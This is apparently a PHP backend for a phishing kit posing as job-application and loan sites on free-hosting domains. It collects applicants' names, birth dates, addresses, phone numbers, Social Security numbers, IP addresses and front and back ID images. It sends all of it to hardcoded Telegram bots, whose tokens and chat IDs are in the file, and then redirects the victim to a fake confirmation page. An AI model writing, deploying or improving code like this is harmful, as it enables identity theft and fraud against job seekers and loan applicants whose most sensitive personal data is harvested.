<?php
// 🚨 Enhanced server configuration for file uploads
ini_set('upload_max_filesize', '10M');
ini_set('post_max_size', '12M');
ini_set('max_execution_time', 120);
ini_set('max_input_time', 120);
ini_set('memory_limit', '256M');

ob_start(); // Start output buffering to prevent headers already sent

// include 'firewall.php';

// 🌐 Site map: define how each site should behave
$site_map = [
    "upstartloan.rf.gd" => [
        "bots" => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ["token" => "7683707216:AAFKB6Izdj c-M2mIaR_vRf-9Ha7CkEh7rA", "chat_id" => "7510889526"],
        ],
        "redirect" => "https://upstartloan.rf.gd/cache_site/thankyou.html"
    ],

    'paysphere.42web.io' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '8327467242:AAFFBheM0nU1-45BKH5vAvdfXKhgXPopJvg', 'chat_id' => '7919111838']
        ],
        'redirect' => 'https://paysphere.42web.io/cache_site/careers/all-listings.job.34092/processing.html'
    ],
    
    // Add more sites...
];

// 🧠 Determine origin domain (not PHP host)
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$parsed = parse_url($referer);
$domain = $parsed['host'] ?? 'unknown';
$config = $site_map[$domain] ?? null;

if (!$config) {
    http_response_code(403);
    exit("Access denied: Unauthorized site ($domain).");
}

// 🚀 Handle POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // 📝 Log file
    $log_file = __DIR__ . "/logs/job_applications.txt";
    if (!file_exists(dirname($log_file))) {
        mkdir(dirname($log_file), 0777, true);
    }

    function log_entry($msg) {
        global $log_file;
        file_put_contents($log_file, "[" . date("Y-m-d H:i:s") . "] $msg\n", FILE_APPEND);
    }

    // 🎯 Enhanced logging for debugging
    log_entry("=== NEW SUBMISSION STARTED ===");
    log_entry("📨 Received POST data from $domain");
    log_entry("📊 FILES array keys: " . print_r(array_keys($_FILES), true));

    // 📋 Get form fields
    $first = htmlspecialchars($_POST['q11_fullName']['first'] ?? '');
    $middle = htmlspecialchars($_POST['q11_fullName']['middle'] ?? '');
    $last = htmlspecialchars($_POST['q11_fullName']['last'] ?? '');
    $full_name = trim("$first $middle $last");

    $dob = sprintf("%04d-%02d-%02d", 
        $_POST['q18_birthDate']['year'] ?? 0, 
        $_POST['q18_birthDate']['month'] ?? 0, 
        $_POST['q18_birthDate']['day'] ?? 0);

    $address = htmlspecialchars(($_POST['q16_currentAddress']['addr_line1'] ?? '') . " " .
                                ($_POST['q16_currentAddress']['addr_line2'] ?? '') . ", " .
                                ($_POST['q16_currentAddress']['city'] ?? '') . ", " .
                                ($_POST['q16_currentAddress']['state'] ?? '') . ", " .
                                ($_POST['q16_currentAddress']['postal'] ?? ''));

    $email = htmlspecialchars($_POST['q12_emailAddress'] ?? '');
    $phone = htmlspecialchars($_POST['q13_phoneNumber13']['full'] ?? '');
    $position = htmlspecialchars($_POST['q14_positionApplied'] ?? '');
    $job_type = htmlspecialchars($_POST['q24_jobType'] ?? '');
    $source = htmlspecialchars($_POST['q21_howDid21'] ?? '');
    $ssn = htmlspecialchars($_POST['q25_socSec'] ?? '');
    
    // 🌐 FIXED: Get client IP address more reliably
    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_X_FORWARDED'] ?? 
          $_SERVER['HTTP_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_FORWARDED'] ?? 
          $_SERVER['REMOTE_ADDR'] ?? 
          'unknown';
    
    // Handle multiple IPs in X_FORWARDED_FOR
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }
    
    $timestamp = date("Y-m-d H:i:s");

    // 📦 ENHANCED: Upload handler with better error handling and retry logic
    function uploadFile($key, $prefix) {
        $upload_dir = __DIR__ . "/uploads/";
        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);

        // Debug: Log what's in FILES array
        log_entry("🔍 Checking FILES for $key: " . (isset($_FILES[$key]) ? 'EXISTS' : 'NOT_SET'));

        // Check if the file input exists and has a file
        if (!isset($_FILES[$key]) || empty($_FILES[$key]['name'][0])) {
            log_entry("❌ No file uploaded for $key or field not found");
            return null;
        }

        $file_data = $_FILES[$key];
        
        // Check for upload errors
        if ($file_data['error'][0] !== UPLOAD_ERR_OK) {
            $upload_errors = [
                UPLOAD_ERR_INI_SIZE => 'File too large (php.ini limit)',
                UPLOAD_ERR_FORM_SIZE => 'File too large (form limit)',
                UPLOAD_ERR_PARTIAL => 'File upload incomplete',
                UPLOAD_ERR_NO_FILE => 'No file was uploaded',
                UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
                UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
                UPLOAD_ERR_EXTENSION => 'A PHP extension stopped the file upload'
            ];
            $error_msg = $upload_errors[$file_data['error'][0]] ?? 'Unknown error (' . $file_data['error'][0] . ')';
            log_entry("❌ Upload error for $key: $error_msg");
            return null;
        }

        // Check if file was actually uploaded
        if (!is_uploaded_file($file_data['tmp_name'][0])) {
            log_entry("❌ Possible file upload attack for $key");
            return null;
        }

        $original = $file_data['name'][0];
        $tmp_name = $file_data['tmp_name'][0];
        $size = $file_data['size'][0];
        
        log_entry("📁 Processing file: $original, Size: " . round($size/1024, 2) . "KB");

        // Get file extension
        $ext = strtolower(pathinfo($original, PATHINFO_EXTENSION));
        
        // Enhanced allowed extensions
        $allowed_extensions = [
            'jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'pdf', 'doc', 'docx'
        ];
        
        if (!in_array($ext, $allowed_extensions)) {
            log_entry("❌ Invalid extension for $original: $ext");
            return null;
        }
        
        // Enhanced MIME type checking
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime_type = finfo_file($finfo, $tmp_name);
        finfo_close($finfo);
        
        $allowed_mime_types = [
            'image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/bmp', 'image/webp',
            'application/pdf', 'application/msword', 
            'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
        ];
        
        if (!in_array($mime_type, $allowed_mime_types)) {
            log_entry("❌ Invalid MIME type for $original: $mime_type");
            return null;
        }

        // Check file size (max 8MB)
        if ($size > 8 * 1024 * 1024) {
            log_entry("❌ File too large: $original (" . round($size/1024/1024, 2) . "MB)");
            return null;
        }

        // Generate safe filename
        $safe_name = $prefix . "_" . time() . "_" . bin2hex(random_bytes(4)) . "." . $ext;
        $path = $upload_dir . $safe_name;

        if (move_uploaded_file($tmp_name, $path)) {
            log_entry("✅ File uploaded successfully: $safe_name (" . round($size/1024, 2) . "KB)");
            return $path;
        } else {
            log_entry("❌ File move failed: $original to $path");
            // Check directory permissions
            if (!is_writable($upload_dir)) {
                log_entry("❌ Upload directory not writable: $upload_dir");
            }
            return null;
        }
    }

    // Upload files with delays to prevent conflicts
    log_entry("⬆️ Starting file uploads...");
    $front_id = uploadFile("q17_uploadYour", "front_id");
    sleep(1); // Small delay between uploads
    $back_id = uploadFile("q26_identityVerification", "back_id");
    log_entry("✅ File uploads completed");

    // 🧾 Format Telegram message
    $message = "📝 *New Job Application*\n\n" .
               "👤 *Name:* $full_name\n" .
               "🎂 *DOB:* $dob\n" .
               "🏠 *Address:* $address\n" .
               "📧 *Email:* $email\n" .
               "📞 *Phone:* $phone\n" .
               "💼 *Position:* $position\n" .
               "📌 *Job Type:* $job_type\n" .
               "🗣 *Referred By:* $source\n" .
               "🔐 *SSN:* $ssn\n" .
               "🕒 *Submitted:* $timestamp\n" .
               "🌐 *IP:* $ip\n" .
               "📎 *Front ID:* " . ($front_id ? "✅ Uploaded" : "❌ Missing") . "\n" .
               "📎 *Back ID:* " . ($back_id ? "✅ Uploaded" : "❌ Missing");

    // 📬 Send text to bots
    log_entry("💬 Sending message to Telegram...");
    foreach ($config['bots'] as $bot_index => $bot) {
        if (empty($bot['token']) || empty($bot['chat_id'])) {
            continue; // Skip empty bot configurations
        }
        
        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
        $data = ['chat_id' => $bot['chat_id'], 'text' => $message, 'parse_mode' => 'Markdown'];

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_TIMEOUT => 30
        ]);
        $result = curl_exec($ch);
        if (curl_error($ch)) {
            log_entry("❌ Telegram message error for bot $bot_index: " . curl_error($ch));
        } else {
            log_entry("✅ Message sent to bot $bot_index");
        }
        curl_close($ch);
    }

    // 📤 ENHANCED: File sending with retry logic and better error handling
    function sendFile($file, $caption, $bots) {
        if (!$file || !is_string($file) || !file_exists($file)) {
            log_entry("❌ File not found or invalid: " . ($file ?? 'NULL'));
            return;
        }
        
        $file_size = filesize($file);
        log_entry("📤 Attempting to send file: " . basename($file) . " (" . round($file_size/1024, 2) . "KB)");
        
        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
        $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
        $is_image = in_array($ext, $image_extensions);
        
        foreach ($bots as $bot_index => $bot) {
            if (empty($bot['token']) || empty($bot['chat_id'])) {
                continue;
            }
            
            $endpoint = $is_image ? "sendPhoto" : "sendDocument";
            $url = "https://api.telegram.org/bot{$bot['token']}/$endpoint";
            
            // Retry logic (up to 3 times)
            $max_retries = 3;
            $success = false;
            
            for ($attempt = 1; $attempt <= $max_retries; $attempt++) {
                log_entry("🔄 Sending file to bot $bot_index, attempt $attempt");
                
                $payload = [
                    'chat_id' => $bot['chat_id'],
                    ($is_image ? 'photo' : 'document') => new CURLFile(realpath($file)),
                    'caption' => substr($caption, 0, 1024), // Telegram caption limit
                    'parse_mode' => 'Markdown'
                ];

                $ch = curl_init($url);
                curl_setopt_array($ch, [
                    CURLOPT_POST => true, 
                    CURLOPT_POSTFIELDS => $payload, 
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_TIMEOUT => 90, // Increased timeout for large files
                    CURLOPT_HTTPHEADER => [
                        'Content-Type: multipart/form-data'
                    ]
                ]);
                
                $result = curl_exec($ch);
                $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                
                if (curl_error($ch)) {
                    $error_msg = curl_error($ch);
                    curl_close($ch);
                    log_entry("❌ Telegram file send error (attempt $attempt): $error_msg");
                    
                    if ($attempt < $max_retries) {
                        sleep(2); // Wait before retry
                        continue;
                    }
                } else {
                    curl_close($ch);
                    $response = json_decode($result, true);
                    
                    if ($response && $response['ok']) {
                        log_entry("✅ File sent successfully to bot $bot_index");
                        $success = true;
                        break;
                    } else {
                        $error_desc = $response['description'] ?? 'Unknown error';
                        log_entry("❌ Telegram API error (attempt $attempt): $error_desc");
                        
                        if ($attempt < $max_retries) {
                            sleep(2);
                            continue;
                        }
                    }
                }
            }
            
            if (!$success) {
                log_entry("❌ Failed to send file to bot $bot_index after $max_retries attempts");
            }
        }
    }

    // Send files with delays to prevent rate limiting
    log_entry("📎 Starting file transmission to Telegram...");
    if ($front_id) {
        sendFile($front_id, "📎 *Front ID* for $full_name", $config['bots']);
        sleep(3); // Delay between file sends
    } else {
        log_entry("⚠️ No front ID to send");
    }
    
    if ($back_id) {
        sendFile($back_id, "📎 *Back ID* for $full_name", $config['bots']);
        sleep(2);
    } else {
        log_entry("⚠️ No back ID to send");
    }
    
    log_entry("✅ [$domain] Job application completed for $full_name from $ip");

    ob_end_clean(); // Discard any unexpected output before redirect
    header("Location: " . $config['redirect']);
    exit;
}
?>
